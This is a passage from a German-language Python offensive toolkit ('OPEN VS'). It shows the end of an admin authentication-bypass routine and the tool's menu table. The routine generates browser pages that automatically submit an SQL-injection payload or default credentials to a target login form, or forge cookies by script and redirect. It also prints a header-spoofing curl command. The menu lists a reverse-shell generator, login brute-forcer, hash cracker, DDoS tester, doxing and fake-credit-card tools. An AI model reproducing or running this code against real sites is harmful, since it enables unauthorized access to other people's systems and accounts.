            if any(w in typ.lower() for w in k.lower().split()):
                return k
        return None

    def _build_report_lines():
        lines = []
        lines.append("=" * 70)
        lines.append("  OPEN VS — ADMIN AUTH BYPASS REPORT")
        lines.append("=" * 70)
        lines.append(f"  Datum:      {_ts}")
        lines.append(f"  Ziel:       {url}")
        lines.append(f"  Login-URL:  {login_url}")
        lines.append(f"  Ergebnis:   {crits} kritisch · {warns} Warnungen · {len(hits)} Funde total")
        lines.append("")

        if not hits:
            lines.append("  ERGEBNIS: KEIN BYPASS GEFUNDEN")
            lines.append("")
            lines.append("  Das Admin-Panel konnte mit keiner der getesteten Methoden")
            lines.append("  ohne gültige Zugangsdaten erreicht werden.")
            lines.append("")
            lines.append("  Weitere Empfehlungen:")
            lines.append("  • 2FA aktivieren (TOTP Authenticator-App)")
            lines.append("  • Regelmäßige Passwort-Rotation (alle 90 Tage)")
            lines.append("  • Login-Versuche limitieren (max. 5 Fehlversuche → Sperre)")
            lines.append("  • Fail2Ban oder ähnliche Rate-Limiting Lösung einsetzen")
        else:
            for idx2, (hsev, htyp, hpay, hdet) in enumerate(hits, 1):
                fk2 = _fix_key(htyp)
                urs2, stt2, fix2 = FIXES[fk2] if fk2 else ("?", [], [])
                lines.append(f"  {'='*66}")
                lines.append(f"  FUND #{idx2} [{hsev}] — {htyp}")
                lines.append(f"  {'='*66}")
                lines.append(f"  Payload:         {hpay}")
                lines.append(f"  Server-Reaktion: {hdet}")
                lines.append("")
                lines.append("  WARUM FUNKTIONIERT DAS?")
                lines.append(f"  {urs2}")
                lines.append("")
                lines.append("  SCHRITT-FUER-SCHRITT:")
                for sl in stt2:
                    lines.append(f"  {sl}")
                lines.append("")
                lines.append("  WIE FIXEN?")
                for fl in fix2:
                    lines.append(f"  {fl}")
                lines.append("")
        lines.append("=" * 70)
        return lines

    report_lines = _build_report_lines()

    # ── Bericht anzeigen ─────────────────────────────────────
    print(f"  {DG}╠{'═'*W}╣{R}")
    bericht_titel = "KEIN BYPASS GEFUNDEN" if not hits else f"BYPASS ÜBER: {main_hit[1]}" if main_hit else "BERICHT"
    col_titel = G if not hits else RED
    print(f"  {DG}║{R}{_pad(f'  {col_titel}ABSCHLIESSENDER BERICHT — {bericht_titel}{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    if not main_hit:
        # Kein Bypass
        print(f"  {DG}║{R}  {G}✓ KEIN AUTH-BYPASS GEFUNDEN{R}")
        print(f"  {DG}║{R}  {DIM}Das Admin-Panel konnte mit keiner Methode umgangen werden.{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}Empfehlungen zur weiteren Absicherung:{R}")
        print(f"  {DG}║{R}  {DIM}→ 2FA aktivieren (TOTP / Authenticator-App){R}")
        print(f"  {DG}║{R}  {DIM}→ Login-Versuche auf 5 limitieren dann IP sperren{R}")
        print(f"  {DG}║{R}  {DIM}→ Regelmäßige Passwort-Rotation (alle 90 Tage){R}")
    else:
        ms, mt, mp, md = main_hit
        fk = _fix_key(mt)
        ursache, schritt, fix_lst = FIXES[fk] if fk else ("Unbekannte Ursache", [], [])

        print(f"  {DG}║{R}  {RED}ADMIN-ZUGANG ERLANGT VIA:{R}  {YG}{mt}{R}")
        print(f"  {DG}║{R}  {DIM}Eingesetzter Payload: {R}{YG}{mp[:65]}{R}")
        print(f"  {DG}║{R}  {DIM}Server-Reaktion:      {R}{DIM}{md}{R}")

        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}WARUM FUNKTIONIERT DAS?{R}")
        print(f"  {DG}║{R}  {DIM}{ursache}{R}")

        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}SCHRITT-FÜR-SCHRITT — SO GEHT ES:{R}")
        for sl in schritt:
            print(f"  {DG}║{R}  {DIM}{sl}{R}")

        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {G}WIE FIXEN?{R}")
        for fl in fix_lst:
            print(f"  {DG}║{R}  {DIM}{fl}{R}")

        if len(hits) > 1:
            print(f"  {DG}╠{'═'*W}╣{R}")
            print(f"  {DG}║{R}  {YG}+ {len(hits)-1} weitere Schwachstelle(n) — alle im .txt Bericht{R}")

    # ── Bypass im Browser ausführen ───────────────────────────
    if main_hit:
        ms, mt, mp, md = main_hit
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}Bypass direkt im Browser ausführen? (j/n){R}")
        if (inp("") or "n").lower() == "j":
            import webbrowser, tempfile
            typ_low = mt.lower()

            if "url" in typ_low or "direkt" in typ_low or "panel" in typ_low:
                # Direkt URL öffnen
                webbrowser.open(mp if mp.startswith("http") else url)
                print(f"  {DG}║{R}  {G}✓ Browser geöffnet: {mp if mp.startswith('http') else url}{R}")

            elif "sqli" in typ_low or "sql" in typ_low:
                # HTML-Formular das sich automatisch mit SQLi-Payload submitted
                html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>SQLi Bypass — OPEN VS</title>
<style>body{{background:#111;color:#0f0;font-family:monospace;padding:30px}}
h2{{color:#0ff}}input{{background:#222;color:#0f0;border:1px solid #0f0;padding:6px;width:300px}}
button{{background:#0f0;color:#000;padding:8px 20px;border:none;cursor:pointer;font-weight:bold}}</style>
</head><body>
<h2>SQLi Auth Bypass — OPEN VS</h2>
<p>Ziel: <b>{login_url}</b></p>
<p>Payload wird automatisch eingetragen und abgeschickt:</p>
<form method="POST" action="{login_url}" id="f">
  <input name="{u_field}" value="' OR '1'='1" /><br><br>
  <input name="{p_field}" value="' OR '1'='1" /><br><br>
  <button type="submit">BYPASS AUSFÜHREN</button>
</form>
<script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>
</body></html>"""
                tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".html",
                      dir=os.path.expanduser("~"), mode="w", encoding="utf-8")
                tmp.write(html); tmp.close()
                webbrowser.open("file://" + tmp.name)
                print(f"  {DG}║{R}  {G}✓ Browser geöffnet — Formular wird automatisch abgeschickt{R}")

            elif "cookie" in typ_low:
                # HTML mit JS der Cookie setzt und dann weiterleitet
                cookie_js = "; ".join(f"document.cookie='{k}={v}; path=/'"
                    for part in mp.split(";") for k,v in [part.strip().split("=",1)]
                    if "=" in part)
                html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Cookie Bypass — OPEN VS</title>
<style>body{{background:#111;color:#0f0;font-family:monospace;padding:30px}}
h2{{color:#0ff}}</style></head><body>
<h2>Cookie Forgery Bypass — OPEN VS</h2>
<p>Setzt Cookie: <b>{mp}</b></p>
<p>Leitet weiter zu: <b>{url}</b></p>
<p id="s">Setze Cookie...</p>
<script>
{cookie_js};
document.getElementById('s').innerText = 'Cookie gesetzt! Weiterleitung...';
setTimeout(()=>window.location.href='{url}', 1000);
</script>
</body></html>"""
                tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".html",
                      dir=os.path.expanduser("~"), mode="w", encoding="utf-8")
                tmp.write(html); tmp.close()
                webbrowser.open("file://" + tmp.name)
                print(f"  {DG}║{R}  {G}✓ Browser geöffnet — Cookie wird gesetzt + Weiterleitung{R}")

            elif "default" in typ_low or "cred" in typ_low:
                # Formular mit Default-Creds vorausfüllen
                creds = mp.split(":")
                u_val = creds[0].strip() if creds else "admin"
                p_val = creds[1].strip() if len(creds) > 1 else "admin"
                html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Default Creds — OPEN VS</title>
<style>body{{background:#111;color:#0f0;font-family:monospace;padding:30px}}
h2{{color:#0ff}}input{{background:#222;color:#0f0;border:1px solid #0f0;padding:6px;width:300px}}
button{{background:#0f0;color:#000;padding:8px 20px;border:none;cursor:pointer;font-weight:bold}}</style>
</head><body>
<h2>Default Credentials Bypass — OPEN VS</h2>
<p>Ziel: <b>{login_url}</b></p>
<form method="POST" action="{login_url}" id="f">
  <input name="{u_field}" value="{u_val}" /><br><br>
  <input name="{p_field}" value="{p_val}" type="password" /><br><br>
  <button type="submit">LOGIN</button>
</form>
<script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>
</body></html>"""
                tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".html",
                      dir=os.path.expanduser("~"), mode="w", encoding="utf-8")
                tmp.write(html); tmp.close()
                webbrowser.open("file://" + tmp.name)
                print(f"  {DG}║{R}  {G}✓ Browser geöffnet mit {u_val}:{p_val}{R}")

            elif "header" in typ_low:
                # Header-Bypass geht nicht direkt im Browser — curl-Befehl zeigen
                print(f"  {DG}║{R}  {YG}Header-Bypass geht nicht direkt im Browser.{R}")
                print(f"  {DG}║{R}  {C}Nutze diesen curl-Befehl:{R}")
                hparts = mp.split(":", 1)
                hname = hparts[0].strip(); hval = hparts[1].strip() if len(hparts) > 1 else "true"
                print(f"  {DG}║{R}  {G}curl -H '{hname}: {hval}' {url}{R}")
            else:
                webbrowser.open(url)
                print(f"  {DG}║{R}  {G}✓ Browser geöffnet: {url}{R}")

    # ── Export ────────────────────────────────────────────────
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}Bericht als .txt exportieren? (j/n){R}")
    if (inp("") or "n").lower() == "j":
        fname = os.path.join(os.path.expanduser("~"), f"bypass_report_{_tsf}.txt")
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write("\n".join(report_lines) + "\n")
            print(f"  {DG}║{R}  {G}✓ Gespeichert: {fname}{R}")
        except Exception as e:
            print(f"  {DG}║{R}  {RED}Fehler: {e}{R}")

    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


ACTIONS = {
    "1":ip_lookup,"2":whois_lookup,"3":website_lookup,"4":subdomain_scanner,
    "5":email_validator,"6":pwleak_check,"7":text_encrypt,"8":text_hash,
    "9":base64_tool,"10":wifi_info,"11":cpu_ram,"12":my_ip,"13":speed_test,
    "14":dns_lookup,"15":port_scanner,"16":ping_test,"17":pw_checker,
    "18":pw_gen,"19":file_hash,"20":system_info,"21":dox_lookup,
    "22":mc_lookup,"23":mac_lookup,"24":traceroute,"25":ssl_checker,
    "26":github_lookup,"27":steam_lookup,"28":qr_generator,
    "29":mass_ip_scan,"30":fake_identity,"31":hack_simulator,"32":discord_lookup,
    "33":mc_account_lookup,"36":net_stress_test,
    "37":mc_health_check,"38":tiktok_instagram_lookup,"39":email_osint,
    "40":phone_lookup,"41":youtube_lookup,"42":network_scanner,"43":firewall_tester,
    "44":banner_grabbing,"45":password_vault,"46":steganography,"47":fake_email_sender,
    "48":url_shortener,"49":ip_tracker_link,"50":terminal_map,
    "51":local_ip_logger,
    "52":domain_checker,
    "53":fake_creditcard,
    "54":morse_code,
    "55":ascii_art_gen,
    "56":lan_map,
    "57":wifi_passwords,
    "58":process_monitor,
    "59":autostart_manager,
    "60":username_checker,"61":ip_reputation,"62":subdomain_bruteforce,
    "63":hash_cracker,"64":cve_lookup,"65":http_header_analyzer,
    "66":jwt_decoder,"67":leak_search,"68":email_header_analyzer,
    "69":tor_proxy_checker,
    "70":dir_bruteforce,"71":web_crawler,"72":waf_detector,
    "73":admin_finder,"74":crtsh_lookup,"75":robots_inspector,
    "76":tech_fingerprint,"77":reverse_ip_lookup,"78":idn_homograph,
    "79":cipher_tools,"80":anonymity_test,"81":malware_scanner,
    "82":proxy_vpn_setup,
    "84":wifi_scanner,
    "85":vuln_scanner,
    "86":dns_zone_transfer,
    "87":google_dork_gen,
    "88":cors_checker,
    "90":revshell_gen,
    "91":website_monitor,
    "92":spf_dmarc_checker,
    "93":subdomain_takeover,
    "94":live_net_stats,
    "95":hash_identifier,
    "96":payload_encoder,
    "97":open_redirect_finder,
    "98":full_tech_scan,
    "99":arp_scanner,
    "100":bruteforce_login,
    "101":pw_security_tester,
    "102":full_vuln_analyzer,
    "103":bypass_analyzer,
    "104":security_dashboard,
    "105":master_scan,
    "106":ddos_stress_tester,
    "107":environment_scanner,
    "108":jwt_analyzer,
    "109":secret_scanner,
    "110":http_headers_analyzer,
    "111":api_security_tester,
    "112":cors_tester,
    "113":dependency_checker,
    "114":ssl_deep_scanner,
    "115":mc_security_scanner,
    "116":admin_auth_bypass,
}

if __name__ == "__main__":
    main()
